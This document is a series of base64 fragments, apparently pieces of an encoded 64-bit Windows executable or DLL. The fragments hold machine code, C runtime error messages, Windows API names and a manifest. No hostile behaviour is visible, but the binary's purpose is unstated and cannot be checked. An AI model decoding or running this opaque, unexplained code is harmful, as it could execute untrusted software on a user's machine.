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gAwADIANQANAAoALQAgAHAAdQByAGUAIAB2AGkAcgB0AHUAYQBsACAAZgB1AG4AYwB0AGkAbwBuACAAYwBhAGwAbAANAAoAAAAAAAAAUgA2ADAAMgA2AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAcwB0AGQAaQBvACAAaQBuAGkAdABpAGEAbABpAHoAYQB0AGkAbwBuAA0ACgAAAAAAAAAAAFIANgAwADIANwANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGwAbwB3AGkAbwAgAGkAbgBpAHQAaQBhAGwAaQB6AGEAdABpAG8AbgANAAoAAAAAAAAAAABSADYAMAAyADgADQAKAC0AIAB1AG4AYQBiAGwAZQAgAHQAbwAgAGkAbgBpAHQAaQBhAGwAaQB6AGUAIABoAGUAYQBwAA0ACgAAAAAAAAAAAFIANgAwADMAMAANAAoALQAgAEMAUgBUACAAbgBvAHQAIABpAG4AaQB0AGkAYQBsAGkAegBlAGQADQAKAAAAAABSADYAMAAzADEADQAKAC0AIABBAHQAdABlAG0AcAB0ACAAdABvACAAaQBuAGkAdABpAGEAbABpAHoAZQAgAHQAaABlACAAQwBSAFQAIABtAG8AcgBlACAAdABoAGEAbgAgAG8','AbgBjAGUALgAKAFQAaABpAHMAIABpAG4AZABpAGMAYQB0AGUAcwAgAGEAIABiAHUAZwAgAGkAbgAgAHkAbwB1AHIAIABhAHAAcABsAGkAYwBhAHQAaQBvAG4ALgANAAoAAAAAAAAAAAAAAAAAUgA2ADAAMwAyAA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAbABvAGMAYQBsAGUAIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4ADQAKAAAAAAAAAAAAAAAAAFIANgAwADMAMwANAAoALQAgAEEAdAB0AGUAbQBwAHQAIAB0AG8AIAB1AHMAZQAgAE0AUwBJAEwAIABjAG8AZABlACAAZgByAG8AbQAgAHQAaABpAHMAIABhAHMAcwBlAG0AYgBsAHkAIABkAHUAcgBpAG4AZwAgAG4AYQB0AGkAdgBlACAAYwBvAGQAZQAgAGkAbgBpAHQAaQBhAGwAaQB6AGEAdABpAG8AbgAKAFQAaABpAHMAIABpAG4AZABpAGMAYQB0AGUAcwAgAGEAIABiAHUAZwAgAGkAbgAgAHkAbwB1AHIAIABhAHAAcABsAGkAYwBhAHQAaQBvAG4ALgAgAEkAdAAgAGkAcwAgAG0AbwBzAHQAIABsAGkAawBlAGwAeQAgAHQAaABlACAAcgBlAHMAdQBsAHQAIABvA','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